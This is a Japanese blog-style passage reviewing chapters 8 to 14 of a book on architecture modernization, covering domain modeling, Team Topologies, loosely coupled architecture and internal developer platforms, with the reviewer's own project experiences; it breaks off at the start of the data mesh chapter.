ボトムアップでわかる！ドメイン駆動設計の基本作者:成瀬 允宣翔泳社Amazon製品現代化の本質製品現代化の本質は、単なる技術的なアップデートではありません。著者は、多くの組織が陥りがちな 古いシステムを新技術で再構築するという罠 について警鐘を鳴らしています。現代化は、長年抱えてきた問題に向き合い、不要な複雑性を排除する機会です。リファクタリング 既存のコードを安全に改善する（第2版）作者:ＭａｒｔｉｎＦｏｗｌｅｒオーム社Amazonこの点は、英国政府のデジタルサービス（GDS）の事例で端的に示されています。GDSは、政府サービスの現代化において、ユーザー中心設計と継続的デリバリーを重視する方針を採用しました。その結果、数十年にわたって変更されていなかった政策やプロセスの見直しにまで踏み込んだ改革を実現しています。Figure 8.1が示すように、現代化は製品スタック全体に影響を与えます。UIの改善はユーザーの生産性向上につながり、ソフトウェアの改善はドメインとの整合性を高めます。さらに、概念的なドメインモデルの改善は、組織全体のコミュニケーションと革新を促進します。Figure 8.1 Full-stack modernization, from business domain up to user interface より引用要件の再定義プロセス製品要件の特定において、著者は 既存コードの単純な逆エンジニアリングを避けるべきと主張します。その理由は明確です。既存システムには、もはや不要な機能や、当初から有用性の低かった機能が含まれている可能性が高いからです。Citibank社の事例は、この問題の深刻さを示す象徴的な例です。1990年代スタイルのユーザーインターフェースが原因で、5億ドルの損失を被った事例は、内部向けシステムのUX軽視がもたらすリスクを如実に示しています。特に重要なのは 継続的なディスカバリー の実践です。著者はTeresa Torresの「Continuous Discovery Habits」を引用しながら、週次でのユーザー接点を持つことの重要性を強調しています。これは単なる検証ではなく、共創のマインドセットに基づく早期フィードバックの獲得を意味します。agnozingdays.hatenablog.comドメインモデルの現代化ドメインモデルの現代化は、組織のコミュニケーションと協働に直接的な影響を与えます。著者は、同じ用語に対する異なる解釈が引き起こす問題を、North American Smart Citiesの事例で示しています。「activated」という単語の解釈の違いが、品質エンジニアとソリューションアーキテクトの間で深刻な対立を引き起こした事例は、共通言語の重要性を端的に示しています。Figure 8.3は、同じフレーズが異なるドメイン概念を指す場合に発生する問題を視覚化しています。このような曖昧性は、コラボレーションの効率低下とコードの複雑化を招く原因となります。Figure 8.3 Problems arise when the same phrase is used to describe different domain concepts. より引用プロセスモデリングの実践著者は、プロセスモデリングEventStormingを、将来のドメイン状態を設計するための効果的なツールとして提案しています。この手法の特徴は、その構造化されたアプローチにあります。Figure 8.4は、アクター、アクション、システム、ドメインイベント、ポリシー、情報という基本的な要素を示しています。Figure 8.4 Process modeling EventStorming notation and syntax より引用この手法の実践では、良い質問をすることが重要です。著者は、「この役割を担う人数は何人か」「一人が複数の役割を担えるか」といった質問を通じて、機会の規模と最適化のポイントを特定することを推奨しています。Figure 8.8は、この質問アプローチの実践例を示しています。Figure 8.8 Asking questions about people in the domain to unlock valuable conversations より引用ドメインストーリーテリングの活用ドメインストーリーテリングは、EventStormingと並ぶ重要なモデリング手法です。著者はこの手法の特徴として、「ストーリー」を中心に据えた探索的なアプローチを挙げています。Figure 8.10は、この手法の基本的な表記法を示しています。Figure 8.10 The five basic notation elements of the Domain Storytelling pictographic language より引用特に注目すべきは、この手法が 一度に一つのフローに集中する アプローチを取る点です。これはEventStormingの多面的なアプローチとは異なりますが、特定のシナリオを深く理解する上で効果的です。実践的な成果と課題英国のDepartment for Levelling Up, Housing, and Communities の事例は、これらのアプローチの実践的な価値を示しています。彼らは継続的なディスカバリーアプローチを採用し、ユーザー研究を通じて段階的な改善を実現しました。その結果、単なる規制対応を超えて、政策立案者への新たな価値提供まで実現しています。この事例で特に興味深いのは、文脈的探査（contextual inquiry）とユーザビリティテストの組み合わせです。文脈的探査によってユーザーの本質的なニーズを理解し、ユーザビリティテストで具体的な解決策を検証するという二段階のアプローチは、効果的な現代化戦略の好例といえます。まとめ製品とドメインの現代化は、アーキテクチャ現代化の中核を成す要素です。その成功は、技術的な刷新だけでなく、ユーザー体験、製品価値、ドメインモデルの包括的な見直しに依存します。特に重要なのは、現代化を単なる「古いものの置き換え」ではなく、組織の価値創造能力を根本的に強化する機会として捉えることです。この章で示された手法と事例は、現代のソフトウェア開発組織が直面する課題に対する実践的な解決策を提供しています。特に、継続的なディスカバリーとコラボレーティブなモデリング手法の組み合わせは、現代化プロジェクトの成功に不可欠な要素といえるでしょう。私たちアーキテクトは、これらの知見を活かし、技術とビジネスの架け橋となる現代化戦略を策定していく必要があります。9 Identifying domains and subdomains第9章「Identifying domains and subdomains」は、アーキテクチャ現代化における最も重要な課題であるドメインとサブドメインの識別について論じています。著者はドメイン境界の設計がチームの効果的な構造化とルースカップリングなアーキテクチャの実現に不可欠であることを示し、その実践的なアプローチを提示しています。新版　考える技術・書く技術　問題解決力を伸ばすピラミッド原則作者:バーバラ・ミントダイヤモンド社Amazonドメイン境界の本質と価値良いドメイン境界の設計は、単なる技術的な課題を超えた組織的な価値を持ちます。Figure 9.2が示すように、適切なドメイン境界は依存関係の削減による開発の高速化とチームの幸福度向上をもたらします。関連する概念のまとまりは明確な目的意識を生み、チームの動機付けと持続可能な実践を促進します。Figure 9.2 Well-designed domain boundaries maximize cohesion and minimize coupling, contributing to higher-performing teams and better products. より引用この価値は特にレガシーシステムの現代化において顕著です。私が過去に担当した金融機関のプロジェクトでは、明確なドメイン境界の欠如が開発の遅延と品質の低下を引き起こしていました。チーム間の依存関係が複雑に絡み合い、小さな変更でも多数のチームの調整が必要になる状況でした。結果として、1行のコード変更に数週間の調整期間を要することもありました。ドメイン境界設計の実践例BBCの事例は、ドメイン境界の進化を示す典型的な例です。当初BBCはニュース・スポーツ・天気予報といった垂直方向のサービスごとに境界を設定していました。各サービスは独自の発展を遂げ、週間数百万のアクセスを誇る規模に成長しました。しかしこの構造は、サービス間での一貫した体験の提供を難しくしていました。そこでBBCは、記事・検索・トピックといった水平方向のドメインへと再構成を行いました。この変更により、共通コンポーネントの再利用が促進され、パーソナライゼーションや分析といった横断的な機能の実装が容易になりました。現代化の具体的アプローチFigure 9.12は、大規模航空会社におけるドメイン分割の具体例を示しています。予約・ロイヤルティ・チェックイン・旅程管理といった明確な責任範囲を持つドメインが識別されています。各ドメインは複数のサブドメインで構成され、独立したチームによる開発を可能にしています。Figure 9.12 Domains and subdomains identified at the airline (Source: Javiera Laso) より引用この事例で興味深いのは、同じ名前のサブドメインが異なるドメインに存在する点です。一般的なアーキテクトの直感に反するこの決定は、各ドメインにおける意味的な違いに基づいています。私の経験でも、一見同じに見える概念でも、ビジネスコンテキストが異なれば別々に扱うべき場合が多々あります。評価と発展のフレームワークFigure 9.21のサブドメイン概要キャンバスは、ドメイン境界の妥当性を評価するための実践的なツールです。このキャンバスは目的・主要概念・イベント・ポリシーなど、多面的な視点からドメインを分析します。私はこのキャンバスを使って、チームとステークホルダー間の対話を促進し、境界の設定に関する合意形成を図っています。Figure 9.21 The subdomain overview canvas より引用特に重要なのは、このキャンバスを通じて見えてくる依存関係の評価です。Vlad Khononovの提案する Pain = Strength * Volatility * Distance という公式は、依存関係の問題を定量的に評価する枠組みを提供します。私のプロジェクトでは、この公式を使って優先順位付けを行い、最も問題のある依存関係から順に解消していく戦略を採用しています。継続的な進化の実践ドメイン境界の設計は一回限りの活動ではありません。新機能の追加や事業環境の変化により、継続的な見直しが必要になります。最近のプロジェクトでは、マイクロサービスへの移行過程で、想定外の依存関係が発見され、境界の再設計が必要になりました。この課題に対して私たちが採用している手法は、四半期ごとのドメインレビューです。このレビューでは、変更頻度・依存関係のコスト・チームの生産性などの指標を評価し、必要に応じて境界の調整を行います。この定期的なフィードバックループが、境界設計の持続的な改善を可能にしています。まとめドメインとサブドメインの識別は、アーキテクチャ現代化の成功を左右する重要な要素です。技術的な側面だけでなく、組織の目標達成のための戦略的な活動として捉えることが重要です。BBCや航空会社の事例が示すように、適切なドメイン境界は組織の革新能力と開発効率を大きく向上させます。今後、マイクロサービスアーキテクチャの普及とともに、この課題の重要性は更に増すでしょう。私たちアーキテクトは、この章で示された原則と手法を実践に活かしながら、組織の持続的な進化を支援していく必要があります。10 Strategic IT portfolio第10章「Strategic IT portfolio」は、アーキテクチャ現代化における戦略的なIT投資の重要性とその実践方法について論じています。著者はアーキテクチャをポートフォリオとして捉え、ビジネス価値に基づいた投資判断を行うことの重要性を示し、その具体的なアプローチを提示しています。良い戦略、悪い戦略 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon戦略的ITの本質Martin Fowlerが提唱する「Utility versus Strategic IT」の二分法は、ITの戦略的価値を評価する基本的なフレームワークを提供します。ビジネスの差別化に寄与するソフトウェアは戦略的ITとして、単なるビジネスコストとしてのソフトウェアはユーティリティITとして分類されます。私の経験でも、この分類は実践的な価値があります。ある物流企業のプロジェクトでは、貨物の積載最適化や動的なETA計算の機能は戦略的ITとして位置付けられました。これらの機能は競合他社との差別化につながり、顧客維持率と運用効率の向上に貢献しました。一方で請求システムはユーティリティITとして扱われ、より洗練された機能を追加しても市場での優位性にはつながらないと判断されました。特に重要なのは、この分類が単なる理論的な枠組みではなく、具体的な投資判断と運用モデルの指針となる点です。チームの規模、メンバー構成、コラボレーションの方法、優先順位付け、アーキテクチャの選択など、多くの実務的な意思決定に影響を与えます。私の経験では、この分類を明確にすることで、組織全体の方向性が揃い、より効果的な資源配分が可能になりました。コアドメインチャートの活用著者は戦略的ITの評価ツールとして「Core Domain Charts」を提案しています。Figure 10.4に示されるように、このツールはビジネスの差別化度とモデルの複雑性という2つの軸でドメインを評価します。特に重要なのは、この評価が単なる分類に留まらず、投資判断と運用モデルの具体的な指針となる点です。Figure 10.4 A blank Core Domain Chart より引用電子スクーター企業の事例（Figure 10.5）は、このアプローチの実践を示しています。配車計画のドメインは高い差別化可能性と複雑性を持つため、コアドメインとして位置付けられました。このドメインには長期的な投資とシニアエンジニアの配置、高度なアーキテクチャパターンの採用が必要とされました。Figure 10.5 Core Domain Chart for the hypothetical shared scooter company より引用モデルの複雑性の評価には、ユーザーニーズの発見、製品設計、ドメインモデル設計、ソフトウェアの実装と進化、運用サポートなど、多面的な要素が含まれます。私の経験では、この包括的な評価アプローチにより、技術的な観点だけでなく、ビジネス価値の創出に必要な投資の全体像を把握することが可能になりました。戦略的パターンの認識著者は、コアドメインチャート上に現れる典型的なパターンとその含意を解説しています。特に興味深いのは決定的コア（Decisive Core）と隠れたコア（Hidden Core）の概念です。決定的コアは高い差別化と複雑性を持ち、市場での決定的な優位性をもたらす可能性を持ちます。隠れたコアは、ソフトウェア外の複雑性をソフトウェア化することで戦略的価値を生み出せる可能性がある領域です。また、疑わしいサポート（Suspect Supporting）というパターンは、差別化度が低いにも関わらず高い複雑性を持つドメインを示します。このパターンは多くの場合、技術的負債の蓄積を示唆しており、複雑性の低減が必要となります。私のプロジェクトでも、このパターンの特定が技術的負債への取り組みの優先順位付けに役立ちました。継続的な進化の重要性Vintedの事例は、戦略的ITポートフォリオの継続的な進化の重要性を示しています。カテゴリー管理という一見単純な領域が、実は戦略的な価値を持つコアドメインであることが、Core Domain Chartsを通じて明らかになりました。この発見は、組織の投資判断と技術戦略に大きな影響を与えました。特に注目すべきは、この発見が製品戦略との整合性を取る過程で得られた点です。ドメインの境界や技術的な実装の選択は、より大きな戦略的文脈の中で決定される必要があります。私の経験でも、技術的な決定を製品戦略と結びつけることで、より説得力のある提案が可能になりました。まとめ第10章は、アーキテクチャ現代化における戦略的な投資判断の重要性と、その実践的なアプローチを提供しています。特に重要なのは、アーキテクチャをポートフォリオとして捉え、ドメインごとに適切な投資と運用モデルを選択する視点です。この章で示された手法と知見は、現代のソフトウェア開発組織が直面する課題に対する具体的な解決策となります。私たちアーキテクトは、これらの知見を活かし、技術的な卓越性だけでなくビジネス価値の創出を重視した戦略的な判断を行っていく必要があります。特に、Core Domain Chartsを活用した投資判断の枠組みは、組織の現代化戦略を具体化する上で重要なツールとなるでしょう。11 Team Topologies第11章「Team Topologies」は、アーキテクチャ現代化における組織とソフトウェアの共進化の重要性に焦点を当てています。著者はMatthew SkeltonとManuel Paisが提唱するTeam Topologiesのフレームワークを基に、独立した価値ストリームを実現するためのチーム設計と進化のアプローチを提示しています。チームトポロジー　価値あるソフトウェアをすばやく届ける適応型組織設計作者:マシュー・スケルトン,マニュエル・パイス日本能率協会マネジメントセンターAmazonチーム設計の基本原則効果的なアーキテクチャ現代化には組織とソフトウェアの共同最適化が不可欠です。Figure 11.1が示すように、チーム間の依存関係の最小化とフローの最大化は現代化の中核的な課題です。Figure 11.1 Refining and validating domain boundaries with Team Topologies より引用私の経験でも、チーム構造とアーキテクチャの不整合は深刻な問題を引き起こします。以前関わったある金融機関のプロジェクトでは、チーム間の境界が不明確だったため、同じコードベースに複数のチームが介入し頻繁な調整が必要になりました。結果として、小さな変更にも数週間の時間を要する状況に陥りました。Team Topologiesは持続可能な高速フローを実現するための原則を提供します。この持続可能性が重要です。私が経験した多くの組織では、短期的な速度を追求するあまり技術的負債を蓄積し、最終的にはフローが著しく低下する結果となりました。 speakerdeck.com4つのチームタイプと3つの相互作用モードFigure 11.3は、Team Topologiesが提唱する4つのチームタイプを示しています。ストリーム整合型チームは製品機能の開発に直接関わり、プラットフォームチームは共通基盤を提供します。複雑サブシステムチームは特殊な専門知識を要する領域を担当し、イネーブリングチームは他のチームの成長を支援します。Figure 11.3 The four team types of Team Topologies より引用チーム間の相互作用には3つのモードがあります。コラボレーションは共通の目標に向けて密接に協力する形態で、X-as-a-Serviceは一方のチームが他方のサービスを利用する形態です。ファシリテーションは一時的な支援を提供する形態となります。私の実践では、これらのパターンを固定的に捉えるのではなく、状況に応じて柔軟に組み合わせることが重要でした。特に、プラットフォームチームとストリーム整合型チームの関係は、初期段階では密接なコラボレーションを行い、gradually X-as-a-Serviceに移行していく例が多くありました。コグニティブロードの管理Figure 11.2は、コグニティブロードの観点からチーム境界を評価する方法を示しています。内在的認知負荷はタスクの本質的な複雑さを、外在的認知負荷は環境要因による追加の負荷を、学習的認知負荷は新しい概念の習得に関する負荷を表します。Figure 11.2 Identifying potential high cognitive load on a Core Domain Chart より引用私の経験では、特に外在的認知負荷の管理が重要です。以前参加したプロジェクトでは、レガシーコードの複雑性により、新機能の開発に必要な本質的な作業以外の負荷が大きく、チームの生産性が著しく低下していました。この問題に対し、段階的なリファクタリングと適切なドメイン境界の設定で改善を図りました。チームの進化と再編成著者は、チーム構造を静的なものではなく、継続的に進化するものとして捉えています。Figure 11.10に示されるDiscover to Establishパターンは、その典型的な例です。新しい領域での探索段階では密接なコラボレーションを行い、理解が深まるにつれて相互作用のモードを変化させていきます。Figure 11.10 The discover to establish pattern より引用Heidi HelfandのDynamic Reteamingの概念も重要です。チームの構成は固定的であってはならず、組織の成長、新しい優先順位の発生、知識の共有、学習機会の創出などの理由で適切に変化させる必要があります。私のプロジェクトでも、月次でのメンバーの交代を制度化し、知識の共有と新鮮な視点の導入を図りました。独立した価値ストリームの検証独立した価値ストリームの実現には、Independent Service Heuristics (ISH)が有効です。このツールは、ビジネスインパクト、プロダクト決定の自律性、チームの認知負荷、コスト追跡、依存関係などの観点から、価値ストリームの独立性を評価します。私の経験では、ISHは特にレガシーシステムの現代化において有効でした。ある製造業のプロジェクトでは、ISHを使用して複数の候補となる価値ストリームを評価し、最も効果的な現代化の開始点を特定することができました。コンウェイの法則への対応コンウェイの法則は、組織のコミュニケーション構造がソフトウェアアーキテクチャに反映されることを示しています。著者は、この法則を避けるのではなく、積極的に活用することを提案しています。私が経験した失敗例では、マーケティング部門とIT部門の対立関係がアーキテクチャの複雑化を招いた事例があります。両部門の協力関係の欠如が、データの同期やシステムの整合性の問題を引き起こしました。この経験から、組織構造とアーキテクチャの整合性を意識的に設計することの重要性を学びました。フロントエンドとバックエンドのチーム構成著者は、フロントエンドとバックエンドのチーム構成について、3つの主要なパターンを提示しています。一つ目は「フロントバックチーム」パターンで、各チームがUIとバックエンドの両方を担当します。このパターンでは、一つの機能に関する変更を単一のチームで完結できる利点があります。二つ目は「ドメインごとの専門チーム」パターンです。フロントエンドチームとバックエンドチームは存在しますが、特定のドメイン領域に特化しています。これにより、ドメインの専門性を維持しながら、技術的な専門性も確保できます。三つ目は「完全分離」パターンです。フロントエンド開発を担当するチームとバックエンド開発を担当するチームが完全に分かれています。このパターンでは、技術的な専門性は高まりますが、機能開発時のチーム間調整コストが増大します。私の経験では、この選択は技術的な観点だけでなく、チームメンバーのキャリア志向や組織の文化も考慮する必要があります。ある製品開発組織では、フロントエンドとバックエンドの完全な分離を採用し、専門性の向上を図りましたが、コミュニケーションコストの増大という代償を払うことになりました。特に新機能の開発時には、フロントエンド・バックエンド間のインターフェース設計に多くの時間を要することになりました。まとめTeam Topologiesは、アーキテクチャ現代化における組織とソフトウェアの共進化のための実践的なフレームワークを提供しています。特に重要なのは、チーム構造を静的なものではなく、ビジネスの進化に応じて継続的に適応させていく視点です。私たちアーキテクトは、技術的な設計だけでなく、組織の構造とその進化にも注意を払う必要があります。特に、チームの認知負荷の管理、適切な相互作用モードの選択、そして組織全体としての学習能力の向上が、現代化の成功には不可欠です。この章で示された原則とパターンは、現代のソフトウェア開発組織が直面する複雑性に対する具体的な解決策となります。ただし、これらのパターンを機械的に適用するのではなく、組織の文脈に応じて適切にカスタマイズし、継続的に改善していくことが重要です。著者の提案する「持続可能な高速フロー」という概念は、短期的な生産性と長期的な健全性のバランスを取る上で、私たちに重要な示唆を与えています。アーキテクトとして、この視点を常に意識しながら、組織とアーキテクチャの共進化を導いていく必要があるでしょう。12 Loosely coupled software architecture第12章「Loosely coupled software architecture」は 独立した価値ストリームを実現するために不可欠な疎結合アーキテクチャについて論じています。この章を通じて著者は結合度という抽象的な概念を具体的な設計原則へと落とし込み ソフトウェアアーキテクトが実践で活用できる知見を提供しています。A Philosophy of Software Design, 2nd Edition (English Edition)作者:Ousterhout, John K. Amazon改訂新版　良いコード／悪いコードで学ぶ設計入門 ―保守しやすい　成長し続けるコードの書き方作者:仙塲 大也技術評論社Amazon結合度の本質と戦略的重要性著者は結合度を「一方のコンポーネントが他方のコンポーネントについてどれだけ知っているか」という観点から整理しています。Vlad Khononovの分類によれば 結合度は強い順に「侵襲的結合」「機能的結合」「モデル結合」「契約的結合」の4種類に分類されます。この分類は従来の抽象的な結合度の議論を具体的な評価基準へと昇華させた点で 実務上極めて有用です。最も強い結合である侵襲的結合では プライベートメソッドへのアクセスやデータベーススキーマの共有など あらゆる内部詳細が露出します。この状態では変更の影響範囲が予測不可能となり リスクの高い変更を強いられます。その一方で最も弱い契約的結合では インターフェイスを介した相互作用のみが許可されます。内部の実装詳細が隠蔽されているため 変更の影響を最小限に抑えることができます。Figure 12.1 This chapter covers the software architecture aspect of independent value streams. より引用Figure 12.1 はこれらの結合タイプが価値ストリームの独立性に与える影響を視覚的に表現しています。結合度が強いほどリスクが高くなり 弱いほど安全な変更が可能になることを明確に示しています。特に注目すべきは契約的結合の効果です。インターフェイスの背後にある実装は自由に変更できるため 迅速な進化が可能となります。局所的複雑性と大域的複雑性のバランスアーキテクチャ設計において 著者は局所的な複雑性と大域的な複雑性のバランスを取ることの重要性を指摘しています。マイクロサービス開発の初期には「100行以下のシンプルなサービス」という極端な設計指針が提唱されることがありました。しかしこのアプローチは局所的な複雑性を下げる一方で システム全体の複雑性を大幅に増大させる結果となりました。Figure 12.5 Balancing local and global complexity より引用Figure 12.5 は局所的複雑性と大域的複雑性のトレードオフを示しています。サービスを小規模に保つことで理解や変更は容易になりますが その分サービス間の相互作用が増加し システム全体の複雑性は増大します。私の経験でも 極端な分割は必ずしも最適な選択ではありませんでした。あるプロジェクトでは データの同期や整合性維持のために大量のボイラープレートコードが必要となり 結果として開発者の生産性を低下させる事態となりました。著者はVlad Khononovのフレームワーク「Pain = Strength * Volatility * Distance」を用いて このトレードオフを定量的に評価することを提案しています。このフレームワークは結合の強さ 変更頻度 社会的・技術的な距離という3つの要素から結合がもたらす痛みを評価します。これにより アーキテクト間で客観的な議論が可能となります。アーキテクチャフローのモデリング手法著者は EventStorming Domain Message Flow Modeling Software Design EventStormingといった視覚的なモデリング手法を紹介しています。これらの手法は複数のサブシステム間の相互作用を可視化し 結合度を評価・改善するための効果的なツールです。Eric Evansが提唱するモデル探索の渦巻きは ドメインモデルを継続的に評価・改良するプロセスを示しています。具体的なシナリオをもとに視覚的なモデリングを行い 必要に応じてコードの検証も実施します。私は特にこのアプローチを評価しています。抽象的な議論では見落とされがちな実装上の課題が 具体的なシナリオを通じて早期に発見されるためです。Domain Message Flow Modelingの事例として オンライン車両販売プラットフォームの検査プロセスが示されています。ユーザーの行動に基づいてイベントとコマンドを特定し ドメイン概念とデータフローを可視化します。特に重要なのはイベントとコマンドの使い分けです。コマンドは送信者が次のアクションを決定するのに対し イベントは受信者が判断を行います。このように意思決定の所在を明確化することで 将来の変更容易性が向上します。サブシステム設計の実践著者は個々のサブシステムの設計を評価するためのツールとして Bounded Context Canvas を提案しています。このキャンバスは名前 説明 戦略的分類 ドメインロール コミュニケーションパターンなど 8つのセクションでサブシステムを多面的に評価します。私の実践では このキャンバスを使うことでステークホルダー間の認識の齟齬を早期に発見できました。特に「domain roles」セクションは チームの責任範囲を明確化する上で有効でした。また「inbound/outbound communication」セクションは 依存関係の可視化に役立ち 不必要な結合の特定を容易にしました。より詳細な設計フェーズでは Software Design EventStorming が効果的です。この手法は従来のEventStormingにアグリゲートという概念を追加し より実装に近いレベルでモデリングを行います。視覚的な表現により 関係者全員がドメインモデルを共有・議論することが可能となります。サブシステムの現代化戦略著者は現代化戦略を選択するためのフレームワークとして Modernization Strategy Selector を提示しています。このフレームワークは行動の変更とテクノロジーの変更という2つの軸でモダナイゼーション戦略を評価します。行動の変更は既存機能の修正や新機能の追加を テクノロジーの変更はインフラストラクチャやプログラミング言語の刷新を表します。このフレームワークにより ROIを最大化する現代化アプローチを特定することが可能となります。移行パターンとしては Strangler Fig Pattern Bubble Pattern Autonomous Bubble Pattern などが紹介されています。Strangler Fig Patternでは 新しいシステムが既存のモノリスを徐々に包み込んでいきます。ルーティングコンポーネントがリクエストを振り分け 新しい機能は現代化されたサブシステムで処理します。一方 Bubble Patternでは 新しいサブシステムを既存システムの前に配置し アンチコラプションレイヤーを通じて古いシステムと統合します。さらに進化したAutonomous Bubble Patternでは 新しいサブシステムが独自のデータストアを持ち 非同期のデータ同期で既存システムと連携します。私の経験では Strangler Fig Pattern が最も実践的でした。段階的な移行が可能なため リスクを最小限に抑えながら現代化を進めることができました。まとめ本章は疎結合アーキテクチャの理論と実践を包括的に扱っています。特に価値があるのは 抽象的な概念を具体的な評価基準とツールセットへと変換している点です。Vlad Khononovの結合度フレームワークは結合の影響を定量的に評価する基準を提供し さまざまなモデリング手法は結合度を視覚化・改善するための実践的なアプローチを示しています。アーキテクトとして私が特に注目しているのは 局所的複雑性と大域的複雑性のバランスです。極端な分割や過度の統合を避け 組織の文脈に応じた適切なバランスを見出すことが重要です。また 現代化戦略の選択においては ROIを最大化する移行パターンの特定が鍵となります。結合度の設計はソフトウェアアーキテクチャの根幹をなす課題です。本章で示された原則とツールセットは この課題に対する実践的な解決策を提供しています。今後のソフトウェア開発において これらの知見はますます重要性を増すでしょう。13 Internal developer platforms第13章「Internal developer platforms」は アーキテクチャ現代化における開発者体験の重要性から始まり 独立した価値ストリームを実現するためのプラットフォーム戦略 そして 組織全体での効果的なプラットフォーム運用に至るまで 幅広いトピックをカバーしています。この章を通じて著者は組織がいかに優れたIDPを構築し 継続的なイノベーションを実現できるかを示しています。この資料は秀逸なので読んでほしいです。 speakerdeck.com自分のブログもこちらに添えさせていただきます。syu-m-5151.hatenablog.com開発者体験の本質著者は優れた開発者体験(DX)を独立した価値ストリームの基盤として位置付けています。最も重要なのはチームが価値創造に集中できる環境を整備することです。私の経験でも 多くの組織で開発者は本質的ではない作業に時間を取られすぎています。ある企業では新しいサービスの立ち上げに数週間を要し その大半がインフラ構築やCI/CDパイプラインの設定に費やされていました。単なる開発効率の改善だけでなく イノベーションの速度も重要な指標です。ある金融機関では 新機能のリリースに数ヶ月を要していましたが その大半は手作業による検証とデプロイメントプロセスでした。IDPの導入後は これらのプロセスが自動化され リリースサイクルは週単位まで短縮されました。結果として 競合他社に先駆けた新機能の展開が可能となりました。現代の開発者体験に求められる要件は厳格です。著者は新規アプリケーションを1日以内にプロダクションまで到達させることを基準として挙げています。これはHMRCのMDTPプラットフォームの事例で示されるように 実現可能な目標です。MDTPでは60以上のチームが日次デプロイメントを実現し 新規サービスの立ち上げも数分で完了できました。私の実践では セルフサービス化が鍵となります。あるEコマース企業では 各種リソースの作成やデプロイメントに毎回プラットフォームチームへの依頼が必要でした。この非効率な状況を改善するため AWSのようなセルフサービスモデルを参考に プラットフォームを再設計しました。その結果 開発チームは必要なときに即座にリソースを利用できるようになり 生産性が大幅に向上しました。Figure 13.1 The role of IDPs in enabling independent value streams より引用Figure 13.1は開発者体験とIDPの関係性を示しています。IDPは開発者の認知負荷を軽減し 価値創造に集中できる環境を提供します。これは単なる技術的な問題ではなく 組織の競争力に直結する戦略的な課題です。プラットフォームの基本能力著者は効果的なIDPが備えるべき能力として ゴールデンパス ビルド・デプロイパイプライン 可観測性 アプリケーションカタログなどを挙げています。中でも重要なのはゴールデンパスです。これは新規アプリケーション作成のための自動化された手順を提供します。可観測性の実現も重要な要素です。私が関わった製造業のプロジェクトでは 本番環境でのトラブルシューティングに多大な時間を要していました。OpenTelemetryを活用した統合的な監視基盤を整備することで 問題の特定と解決が格段に効率化されました。さらに プロアクティブな性能改善も可能となり システムの安定性が向上しました。Figure 13.2 Paved road for creating a new microservice and pushing to production in just a few hours より引用Figure 13.2は英国のネオバンクにおけるゴールデンパスの実装例を示しています。彼らは2000以上のマイクロサービスを運用しながら 数時間でプロダクションへのデプロイを実現しています。このような俊敏性は標準化された技術スタックと自動化された開発フローによって支えられています。私の実務経験でも ゴールデンパスの価値は明らかでした。あるプロジェクトでは Spring Boot ベースのマイクロサービステンプレートを整備し デプロイメントパイプラインやモニタリングの設定を自動化しました。その結果 新規サービスの立ち上げ時間は2週間から2時間へと劇的に短縮されました。アプリケーションカタログの整備も重要です。ある大規模組織では 類似機能を持つAPIが複数存在し 運用コストの増大を招いていました。Backstageを活用したカタログ整備により APIの可視性が向上し 再利用が促進されました。結果として 開発コストの削減と品質の向上を実現できました。プラットフォーム運用の実践著者はIDPをプロダクトとして扱うことの重要性を強調しています。これは単なる技術的なインフラストラクチャではなく 継続的に進化するサービスとして捉える必要があります。La Redouteの事例は この考え方を実践的に示しています。プロダクトマインドセットの具体的な実践として 定期的なフィードバックの収集があります。私のチームでは四半期ごとに開発者満足度調査を実施し その結果をプラットフォームの改善計画に反映しています。また 月次のプラットフォームユーザー会を開催し 開発者との直接対話の機会を設けています。彼らはプラットフォーム運用において 品質 効率性 スピードの3つの指標を重視しました。特筆すべきは プラットフォームチームが開発者を顧客として扱い その体験を継続的に改善していた点です。これは私が経験した多くのプラットフォームチームとは異なるアプローチでした。セキュリティとコンプライアンスの統合も重要な課題です。ある金融機関では セキュリティ要件の充足に多大な工数を要していました。IDPにセキュリティチェックを組み込むことで この問題を解決しました。自動化されたコードスキャンと監査ログの生成により コンプライアンス対応が効率化されました。プラットフォーム運用で重要なのは標準化と柔軟性のバランスです。MDTPの事例では Scala と Play Framework への強い標準化により 高度な自動化を実現しました。一方でNetflixは より柔軟なアプローチを採用し チームの技術選択の自由度を高く保っています。プラットフォームチームの構成も成功の鍵となります。私の経験では エンジニアリングスキルとプロダクトマインドセットを併せ持つ人材が必要です。また サポート担当とプラットフォーム開発者を分離し それぞれが専門性を発揮できる体制を整えることも有効でした。投資判断の指針著者は最小限の実行可能なプラットフォーム(TVP)という概念を提示しています。これは大規模なビッグバンプロジェクトを避け 必要最小限の機能から始めることを推奨します。私も同意見です。過去に関わった大規模なプラットフォーム構築では 2年の開発期間を経ても利用率が低く 投資対効果の説明に苦慮した経験があります。プラットフォーム構築の判断基準として 著者は組織の規模だけでなく採用可能性も重視します。技術スタックの強制や既存システムからの移行コストが高い場合 プラットフォームは形骸化するリスクがあります。実践的なアプローチとして 段階的な展開が有効です。あるプロジェクトでは まずCI/CDパイプラインの標準化から着手し その価値が認められた後に他の機能を順次追加していきました。このアプローチにより 投資対効果の可視化と関係者の合意形成が容易になりました。ビルドvs購入の判断も重要です。市場には様々なプラットフォームソリューションが存在します。私の経験では 汎用的な機能は既存ソリューションを活用し 組織固有のニーズに対応する部分のみを内製する戦略が効果的でした。まとめ本章はIDPの構築と運用に関する包括的な指針を提供しています。特に価値があるのは開発者体験を中心に据えたアプローチです。プラットフォームチームは技術的な卓越性だけでなく サービスマインドセットを持つことが求められます。今日のソフトウェア開発において IDPは組織の競争力を左右する重要な要素となっています。しかしその構築には慎重な判断と継続的な投資が必要です。プラットフォーム構築を検討する組織は まず最小限の機能から始め 利用状況と価値創出を確認しながら段階的に発展させていくアプローチを採用すべきでしょう。重要なのは IDPを単なるツール群としてではなく 組織の開発生産性とイノベーション能力を高めるための戦略的資産として位置付けることです。その成功は技術的な選択だけでなく 組織文化や人材育成を含めた包括的なアプローチにかかっています。優れたIDPは 開発者が本質的な価値創造に集中できる環境を提供し 組織全体のイノベーション能力を高めます。今後も クラウドネイティブ技術の進化や開発手法の多様化に応じて IDPの重要性は増していくでしょう。アーキテクトとして この領域への深い理解と実践的な経験がますます求められています。14 Data mesh revolutionizing data engineering第14章「Data mesh revolutionizing data engineering」は データ管理の基本概念とその進化から始まり データメッシュの4つの原則とその実践 そしてデータ量子という革新的な概念の導入に至るまで データエンジニアリングの現代化に関する包括的な内容を提供しています。この章を通じて 著者は従来のデータ管理手法の限界と それを克服するためのデータメッシュアーキテクチャの可能性を示しています。syu-m-5151.hatenablog.comデータエンジニアリングの変遷と課題著者はまず 